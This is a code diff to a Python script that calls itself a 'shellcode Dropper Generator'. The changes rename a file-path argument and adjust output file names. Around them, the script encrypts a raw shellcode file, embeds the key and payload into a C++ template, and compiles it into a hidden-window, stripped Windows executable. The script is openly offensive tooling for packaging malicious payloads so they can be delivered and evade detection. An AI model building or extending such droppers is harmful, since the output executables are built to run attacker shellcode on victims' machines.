@@ -52,11 +52,14 @@ def encrypt(plaintext):
 def main():
 
     parser = argparse.ArgumentParser(description="Simple raw shellcode Dropper Generator")
-    parser.add_argument("binaryName", help="File name contains raw shellcode")
+    parser.add_argument("binaryPath", help="File containing raw shellcode")
     parser.add_argument("-a", "--arch", default="1", help="Shellcode Architecture (1=x64, 2=x86) (default=x64)")
     args = parser.parse_args()
-
-    binaryName = args.binaryName
+    
+    binaryPath = args.binaryPath
+    binaryName = binaryPath.split('/')[-1]
+    outputFileName = (binaryPath.split('/')[-1]).split('.')[0]
+    
     try:
         Arch = archs[args.arch]
     except KeyError:
@@ -65,7 +68,7 @@ def main():
 
     # Encrypting provided binary
     try:
-        binaryData = open(binaryName, "rb").read()
+        binaryData = open(binaryPath, "rb").read()
     except FileNotFoundError:
         printE("No such file in directory!")
         sys.exit(1)
@@ -73,20 +76,20 @@ def main():
     printI(f"Generating {Arch} Dropper for {binaryName}")
 
     binaryKey, binaryPayload = encrypt(binaryData)
-    writeToFile(SHELLCODE_MARK, rf"// {binaryName}", 0)
+    writeToFile(SHELLCODE_MARK, rf"// {binaryName}-{Arch}", 0)
     writeToFile(SHELLCODE_MARK, f"unsigned char key[] = {binaryKey}", 1)
     writeToFile(SHELLCODE_MARK, f"unsigned char shellcode[] = {binaryPayload}", 2)
 
     # Compiling Code
     if Arch == "x64":
-        os.system(f"x86_64-w64-mingw32-g++ sources/code.cpp -o output/{binaryName}.exe -lurlmon -lntdll -mwindows -s -ffunction-sections -fdata-sections -Wno-write-strings -Wconversion-null -Wnarrowing -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc")
+        os.system(f"x86_64-w64-mingw32-g++ sources/code.cpp -o output/{outputFileName}.exe -lurlmon -lntdll -mwindows -s -ffunction-sections -fdata-sections -Wno-write-strings -Wconversion-null -Wnarrowing -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc")
     elif Arch == "x86":
-        os.system(f"i686-w64-mingw32-g++ sources/code.cpp -o output/{binaryName}.exe -lurlmon -lntdll -mwindows -s -ffunction-sections -fdata-sections -Wno-write-strings -Wconversion-null -Wnarrowing -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc")
-    os.system(f"/usr/bin/cp sources/code.cpp output/{binaryName}.cpp")
+        os.system(f"i686-w64-mingw32-g++ sources/code.cpp -o output/{outputFileName}.exe -lurlmon -lntdll -mwindows -s -ffunction-sections -fdata-sections -Wno-write-strings -Wconversion-null -Wnarrowing -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc")
+    os.system(f"/usr/bin/cp sources/code.cpp output/{outputFileName}.cpp")
 
     os.system("/usr/bin/cp sources/code.cpp.bak sources/code.cpp")
 
-    printS(f"Executable saved to output/{binaryName}.exe")
+    printS(f"Executable saved to output/{outputFileName}.exe")
 
 if __name__ == "__main__":
     main()
